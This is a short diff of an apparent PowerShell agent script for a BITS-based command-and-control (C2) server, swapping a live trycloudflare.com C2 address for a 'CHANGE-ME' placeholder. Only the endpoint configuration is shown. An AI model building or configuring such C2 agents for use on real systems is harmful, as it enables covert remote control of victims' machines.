@@ -3,7 +3,7 @@
 # Connects to main.py BITS C2 integration on port 8000
 
 # ========== CONFIGURE THIS ==========
-$C2_URL = "https://dale-recently-shed-cup.trycloudflare.com"
+$C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
 # ====================================
 
 $ServerUrl = "$C2_URL/bits"
